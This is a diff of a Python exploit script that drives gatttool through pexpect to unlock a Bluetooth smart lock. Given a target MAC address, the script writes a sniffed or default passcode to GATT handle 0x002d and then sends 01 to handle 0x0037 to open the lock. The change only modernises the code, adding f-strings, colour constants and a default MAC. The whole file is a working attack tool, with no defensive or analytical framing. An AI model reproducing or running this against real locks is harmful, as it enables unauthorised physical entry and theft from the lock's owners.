@@ -1,29 +1,44 @@
 import pexpect
-import time
 
-device=raw_input('Enter Target Lock MAC address: ')
+# Color Codes for Printing
+G = "\033[32m"
+Y = "\033[33m"
+B = "\033[34m"
+R = "\033[31m"
+RES = "\033[0m"
 
-# Run Gat Interactively
-print("\033[1;33;38m [-]\033[0;37;38m Starting Gattool ....")
-child = pexpect.spawn("gatttool -I") # Linux alternative to connect bluetooth devices
+# Ask for MAC address input with a default value
+device = input('Enter Target Lock MAC address [Default: 11:22:33:44:55:66]: ')
+if not device:
+    device = "11:22:33:44:55:66"
+
+# Char-write-req values
+# 0x0037 - GATT code for unlocking the lock
+# 0x002d - GATT code for sending the pincode
+char_values = {
+    "passcode": ("0x002d", "0000"), # Change pincode 0000, if not defaults
+    "unlock": ("0x0037", "01")
+}
+
+print(f"{Y}[-]{RES} Starting Gattool ....")
+child = pexpect.spawn("gatttool -I")  # Linux alternative to connect Bluetooth devices
 
 # Connect to device
-print("\033[1;33;38m [-]\033[0;37;38m Connecting to\033[1;31;38m"),
-print(device),
-child.sendline("connect {0}".format(device))
+print(f"{Y}[-]{RES} Connecting to device {device} ....")
+child.sendline(f"connect {device}")
 child.expect("Connection successful", timeout=5)
-print("\n\033[1;32;38m [+]\033[0;37;38m Connected!")
+print(f"{G}[+]{RES} Connected!")
 
 # Connect with sniffed passcode
-print("\033[1;32;38m [+]\033[0;37;38m Write privileges successful with sniffed passcode")
-child.sendline("char-write-req 0x002d 001234567812345678") #Pairing Pin Code - Interaction With Lock
+print(f"{G}[+]{RES} Write privileges successful with sniffed passcode")
+child.sendline(f"char-write-req {char_values['passcode'][0]} {char_values['passcode'][1]}")  # Pairing Pin Code - Interaction With Lock
 child.expect("Characteristic value was written successfully", timeout=10)
-print("\033[1;32;38m [+]\033[0;37;38m Characteristics 0x002d has been written to Device")
+print(f"{G}[+]{RES} Characteristics {char_values['passcode'][0]} has been written to Device")
 
 # Send write operation to unlock
-print("\033[1;33;38m [-]\033[0;37;38m Sending Write Request 01")
-child.sendline("char-write-req 0x0037 01") # Sending a write request to Lock to Open - Interaction 2 with lock 
+print(f"{Y}[-]{RES} Sending Write Request 01")
+child.sendline(f"char-write-req {char_values['unlock'][0]} {char_values['unlock'][1]}")  # Sending a write request to Lock to Open - Interaction 2 with lock 
 child.expect("Characteristic value was written successfully", timeout=10)
-print("\033[1;32;38m [+]\033[0;37;38m Write Request Successful")
-print("\033[1;32;38m [+]\033[0;37;38m Exit hcitool gracefully")
+print(f"{G}[+]{RES} Write Request Successful")
+print(f"{G}[+]{RES} Exit hcitool gracefully")
 child.expect("\r\n", timeout=10)
